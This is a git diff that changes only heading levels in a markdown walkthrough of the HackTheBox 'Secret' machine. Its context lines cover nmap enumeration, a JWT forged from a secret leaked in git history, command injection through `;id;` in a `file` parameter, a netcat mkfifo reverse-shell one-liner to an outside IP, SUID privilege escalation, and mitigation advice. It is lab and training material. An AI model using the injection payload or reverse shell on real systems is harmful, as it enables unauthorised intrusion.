@@ -13,15 +13,15 @@ img_path: /assets/img/hackthebox/machines/secret
 ---
 
 
-# **Description**
+## **Description**
 
 Hello hackers, I hope you are doing well. We are doing [Secret](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com).
 
 ![](0.png)
 
-# **Enumeration**
+## **Enumeration**
 
-## nmap
+### nmap
 
 We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.
 
@@ -50,7 +50,7 @@ PORT     STATE SERVICE VERSION
 
 We found three open ports, ssh on port 22, nginx on port 80 and node.js on port 3000.
 
-## Web
+### Web
 
 Let's navigate to the web page on port 80.
 
@@ -66,7 +66,7 @@ Clicking on `Register user` we go to this page.
 
 Here it shows us how to interact with the api to register a user.
 
-### Burp Suite
+#### Burp Suite
 
 Let's start burp suite and register a user.
 
@@ -88,7 +88,7 @@ I tried to manipulate the JWT Token to login as admin but it's not vulnerable.
 
 Let's download the source code
 
-### Source Code
+#### Source Code
 
 After extracting the source code we find a `.git` directory, let's check the commit history.
 
@@ -139,9 +139,9 @@ Now back to burp, let's make a request to `/api/priv` using the new token.
 
 It's tells us that we are admin.
 
-# **Foothold**
+## **Foothold**
 
-## Command injection
+### Command injection
 
 When we checked the git logs we see another commit with an interesting comment `now we can view logs from server`
 
@@ -188,7 +188,7 @@ Now let's add the `file` parameter to the url with the value `;id;`
 
 We successfully run the command `id`.
 
-## Reverse shell
+### Reverse shell
 
 To get a shell we can use `nc mkfifo`:
 
@@ -204,7 +204,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 9001 >/tmp/f
 
 We got the shell!
 
-# **Privilege Escalation**
+## **Privilege Escalation**
 
 Running `linpeas` we find a unknown binary with SUID permission.
 
@@ -252,15 +252,15 @@ Using the key let's ssh as root.
 
 ![](16.png)
 
-# **Mitigation**
+## **Mitigation**
 
-## Information Disclosure - Git
+### Information Disclosure - Git
 
 After downloading the source code we find it's a `git` repository which allowed us to view an old commit that contained the secret token.
 
 Examine the entire version history to ensure that sensitive information is not committed in the past. If sensitive data has been found make sure to delete it completely because even deleted commits can be viewed.
 
-## Command Injection
+### Command Injection
 
 Proper input validation should be in place by using whitelists and stripping non-alphanumeric characters
 
